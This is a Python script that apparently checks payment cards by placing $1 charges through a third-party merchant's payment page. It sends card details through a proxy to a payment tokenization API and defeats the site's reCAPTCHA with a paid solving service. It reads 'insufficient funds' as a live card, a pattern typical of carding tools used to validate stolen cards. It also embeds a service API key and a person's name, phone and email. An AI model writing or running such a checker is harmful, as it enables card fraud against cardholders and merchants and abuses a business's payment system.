import asyncio
import re
import random
from httpx import AsyncClient
import capsolver

capsolver.api_key = "CAP-5D246BDACA192D1EAC3F1494BE61BA77"


async def nmi3(cc, mes, ano, cvv,proxyg):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as client:
        ip = await client.get('https://api.ipify.org/')
        print(ip.text)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
        }

        response = await client.get('https://bestcardteam.com/Payments/?Profile=sdaWEB', headers=headers)
        precheck = response.text.split('name="precheck" id="precheck_h" value="')[1].split('"')[0]

        data = {
            'tokenizationKey': 'VgmWsA-f8Qhkd-468cAq-A963F3',
            'cartCorrelationId': '',
        }

        response = await client.post('https://secure.networkmerchants.com/token/api/create', headers=headers, data=data)
        token = response.text.split('"token":"')[1].split('"')[0]
        print(token)
        data = {
            'payment-type': 'cc',
            'cc-number': cc,
            'cc-exp': mes + ano[2:],
            'cc-cvv': "",
            'tokenizationKey': 'VgmWsA-f8Qhkd-468cAq-A963F3',
            'tokenId': token,
            'currency': 'USD',
        }

        response = await client.post(
            'https://secure.networkmerchants.com/token/api/save_full_token',
            headers=headers,
            data=data,
        )
        
        g_response = (await asyncio.to_thread(lambda: capsolver.solve({
            "type": "ReCaptchaV2TaskProxyLess",
            "websiteKey": '6LeivmQbAAAAALAXbsKZU_iVeUo5esiUc05NoiaB',
            "websiteURL": 'https://www.bestcardteam.com',
        })))['gRecaptchaResponse']

        params = {
            'Profile': 'sdaWEB',
        }

        data = {
            'first_name': 'Deyaniris',
            'last_name': 'Vicente',
            'merchant_defined_field_3': 'Deyaniris Vicente',
            'country': 'US',
            'address1': 'BM-594003 8400 NW 25TH ST STE 100, DORAL FL 33198',
            'city': 'Doral',
            'state': 'IL',
            'zip': '33198',
            'phone': '7705238769',
            'email': 'Minostbug@gmail.com',
            'merchant_defined_field_1': 'Online',
            'merchant_defined_field_4': 'No',
            'amount': '1.00',
            'g-recaptcha-response': g_response,
            'Profile': 'sdaWEB',
            'precheck': precheck,
            'payment_token': token,
        }

        req4 = await client.post('https://www.bestcardteam.com/Payments/', params=params, headers=headers, data=data)
    if "Thank you for your payment. Confirmation details are below" in req4.text:
        mensaje = "Charged 1$"
        status = "Approved ✅"
    else:
        mensaje = req4.text.split('<div class="alert alert-danger error-msg">')[1].split('</div>')[0]

        if "Insufficient funds" in mensaje:
            status = "Approved ✅"  
        else:
            status = "Declined ❌"
    return status, mensaje